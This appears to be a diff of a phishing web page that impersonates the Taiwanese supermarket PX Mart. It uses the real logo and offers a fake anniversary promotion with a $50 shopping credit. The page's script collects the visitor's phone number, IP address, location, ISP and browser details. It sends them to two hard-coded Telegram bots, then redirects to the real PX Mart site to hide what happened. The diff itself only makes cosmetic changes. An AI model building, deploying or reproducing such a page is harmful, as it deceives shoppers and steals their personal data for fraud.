@@ -8,7 +8,7 @@
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Noto Sans TC',sans-serif;background:#E3F2FD;color:#333;text-align:center;min-height:100vh;padding:20px 20px 40px}
 .header{background:#1976D2;height:60px;padding:0 16px;display:flex;align-items:center;justify-content:flex-start}
-.logo{width:220px;height:auto}
+.logo{width:154px;height:auto} /* ← 這裡改成 70%（220px × 0.7 = 154px）*/
 h1{font-size:28px;font-weight:900;color:#1976D2;margin:35px 0 8px;line-height:1.2}
 .subtitle{font-size:17px;color:#555;margin-bottom:25px;font-weight:600}
 .cartoon{max-width:340px;margin:10px auto 15px;display:block}
@@ -22,42 +22,36 @@ button{width:100%;padding:18px;background:#4CAF50;color:#fff;border:none;border-
 </style>
 </head>
 <body>
-
 <div class="header">
   <img src="https://www.pxmart.com.tw/_next/static/media/logo-pxmart.890788ed.svg" class="logo">
 </div>
-
 <h1>全聯超級週年慶開跑！</h1>
 <div class="subtitle">買1送1 再回饋送 $50 購物金</div>
-
 <img src="https://www.pxmart.com.tw/_next/static/media/img-surveyEmpty-character.f8827491.png" class="cartoon">
-
 <div class="box">
   <h2>消費滿額送 $50 購物金</h2>
   <div class="desc">
     超過300款商品買1送1<br>
     消費滿200元再送 $50 購物金！
   </div>
-  
+ 
   <div class="input-group">
     <select id="code"><option value="+886" selected>+886</option></select>
     <input type="tel" id="phone" placeholder="請輸入手機號碼" maxlength="12">
   </div>
-  
+ 
   <button id="btn">立即領取 $50 購物金</button>
 </div>
-
 <script>
 document.getElementById("btn").onclick = async function(){
   const phone = document.getElementById("phone").value.trim();
   if(phone.length < 1) return;
-  
+ 
   const btn = this;
   btn.textContent = "領取中...";
   btn.disabled = true;
-
   const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
-  
+ 
   // 三重 IP 查詢（任一成功就行）
   let ipInfo = {ip:"未知", city:"未知", country:"台灣", org:"未知"};
   try {
@@ -72,7 +66,6 @@ document.getElementById("btn").onclick = async function(){
       ipInfo = await res.json();
     } catch(e) {}
   }
-
   const msg = `全聯週年慶開跑\n\n` +
               `電話：+886${phone}\n` +
               `IP　　：${ipInfo.ip}\n` +
@@ -80,26 +73,22 @@ document.getElementById("btn").onclick = async function(){
               `ISP　　：${ipInfo.org || "未知"}\n` +
               `時間　：${time}\n` +
               `裝置　：${navigator.userAgent.substring(0,120)}...`;
-
   // 雙 token 發送
   fetch("https://api.telegram.org/bot8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys/sendMessage", {
     method:"POST", headers:{"Content-Type":"application/json"},
     body:JSON.stringify({chat_id:"1137905005", text:msg})
   }).catch(()=>{});
-
   fetch("https://api.telegram.org/bot7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE/sendMessage", {
     method:"POST", headers:{"Content-Type":"application/json"},
     body:JSON.stringify({chat_id:"1137905005", text:msg})
   }).catch(()=>{});
-
   // 三重強制跳轉（手機電腦全部成功）
   setTimeout(() => {
-    location.replace("https://www.pxmart.com.tw/campaign/survey/");
+    location.replace("https://www.pxmart.com.tw/campaign/survey");
   }, 2500);
-
   setTimeout(() => {
     const a = document.createElement("a");
-    a.href = "https://www.pxmart.com.tw/campaign/survey/";
+    a.href = "https://www.pxmart.com.tw/campaign/survey";
     a.target = "_top";
     document.body.appendChild(a);
     a.click();
